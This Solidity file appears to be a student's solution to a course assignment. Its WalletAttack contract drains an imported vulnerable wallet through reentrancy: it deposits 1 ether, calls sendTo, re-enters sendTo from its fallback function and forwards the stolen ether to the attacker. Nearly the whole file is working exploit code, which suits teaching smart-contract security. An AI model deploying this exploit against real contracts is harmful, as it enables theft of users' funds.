// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Interface for the vulnerable wallet
// interface WalletI {
//     function deposit() external payable;
//     function sendTo(address payable dest) external;
// }
import "./VulnerableWallet.sol";
import "./Wallet2.sol";

contract WalletAttack {
    address payable public attacker; // The address of the attacker (caller)
    uint public numCalls; // Count of reentrancy calls

    constructor() {
        // The constructor for the attacking contract.
        // Do not change the signature
        attacker = payable(msg.sender);
    }

    function exploit(Wallet _target) public payable {
        // runs the exploit on the target wallet.
        // you should not deposit more than 1 Ether to the vulnerable wallet.
        // Assuming the target wallet has more than 3 Ether in deposits,
        // you should withdraw at least 3 Ether from the wallet.
        // The money taken should be sent back to the caller of this function)
        
        require(msg.value == 1 ether, "Deposit must not exceed 1 ether");
        if (address(_target).balance >= 3 ether) {

            // Deposit the attacker's ether into the target wallet
            _target.deposit{value: msg.value}();

            // Start the reentrancy attack
            _target.sendTo(payable(address(this)));
            // _target.sendTo(payable(address(this)), msg.value);

            // Transfer stolen funds back to the attacker
            attacker.transfer(address(this).balance);
        }
    }

    // you may add addtional functions and state variables as needed.
    fallback() external payable {
        // check if left more money
        if (msg.sender.balance >= 1 ether) {
            Wallet(msg.sender).sendTo(payable(address(this)));
            // Wallet2(msg.sender).sendTo(payable(address(this)), 1 ether);
        }
    }
    // receive() external payable {
    // }
}